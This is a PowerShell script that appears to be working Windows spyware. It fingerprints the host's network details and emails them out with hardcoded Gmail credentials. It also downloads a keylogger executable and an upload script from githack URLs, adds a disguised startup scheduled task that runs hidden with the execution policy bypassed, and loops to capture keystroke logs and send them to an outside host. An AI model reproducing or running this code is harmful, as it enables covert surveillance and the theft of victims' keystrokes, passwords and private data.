#comment removed
$pwd =  "$home\AppData\Local"
$browser = New-Object System.Net.WebClient
cd $pwd
function get-hash([string]$textToHash) {
    $hasher = new-object System.Security.Cryptography.MD5CryptoServiceProvider
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($textToHash)
    $hashByteArray = $hasher.ComputeHash($toHash)
    foreach($byte in $hashByteArray)
    {
      $result += "{0:X2}" -f $byte
    }
    return $result;
 }
if( -Not (Test-Path $pwd\fingerprint) ){
    $InternalIP = ipconfig
    $HostName = hostname
    $ExternalIP = $browser.DownloadString("https://ifconfig.me/ip")
    $GeoIP = $browser.DownloadString("https://ipinfo.io/$ExternalIP")
    $Body = "Computer name is $Hostname`n`n*******************`n`nLocal Area Network Configuration`n`n$InternalIP`n`n*******************`n`nInternet Facing IP address`n`n$ExternalIP`n`n*******************`n`nGeoIP information From External IP address`n`n$GeoIP"
    $Fingerprint = get-hash($body)
    $Fingerprint >> $pwd/fingerprint
    $Body = "Computer name is $Hostname`n`n*******************`n`nLocal Area Network Configuration`n`n$InternalIP`n`n*******************`n`nInternet Facing IP address`n`n$ExternalIP`n`n*******************`n`nGeoIP information From External IP address`n`n$GeoIP`n`n*******************`n`nAnd The Computer will be identified with the id $Fingerprint"
    $EmailTo = "commnc@krutt.org"
    $EmailFrom = "elbethender@gmail.com"
    $Subject = "New Host Report" 
    $SMTPServer = "smtp.gmail.com" 
    $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
    $SMTPClient.EnableSsl = $true 
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("elbethender@gmail.com", "homernomer"); 
    $SMTPClient.Send($SMTPMessage)
    $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/f1c5bfa6094e71c5165fcccfc07710887c100e91/kg.exe" , "$pwd\kg.exe" )
    $browser.DownloadFile( "https://raw.githack.com/commnc/sources/master/send.ps1" , "$pwd\send.ps1" )
    schtasks.exe /create /sc onstart /tn "Windows_services_boot_sequence" /rl HIGHEST /tr "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -windowstyle hidden -file '$pwd\bootstrap.ps1'"
}
$ComputerFingerPrint = Get-Content $pwd\fingerprint
$runDuration = 600
taskkill /f /im kg.exe
if( Test-Path $pwd\*.rpr ){
    del $pwd\*.rpr
}
while (1){
        $fileName = (((([string] (get-date) ).Replace(" " , "_")).Replace(":" , "_")).Replace("/" , "_") + ".rpr")
        start $pwd\kg.exe "$pwd\$fileName"
        timeout /t $runDuration /nobreak
        taskkill /f /im kg.exe
        if (( Get-Content "$pwd\$fileName" | Measure-Object -Line ).lines -gt 0){
            if(Test-Connection -Quiet -Count 2 8.8.8.8){
                powershell -executionpolicy bypass -windowstyle hidden -file $pwd\send.ps1 "$fileName"
                powershell -executionpolicy bypass -windowstyle hidden -file $pwd\send.ps1 "$pwd\backlogged.rpr"
                powershell -executionpolicy bypass -windowstyle hidden -file $pwd\send.ps1 "$pwd\backlogged.rpr"
                del "$pwd\*.rpr"
            }
            else{
                Get-Content "$pwd\$fileName" >> "$pwd\backlogged.rpr"
                del "$pwd\$fileName"
            }
        }
}
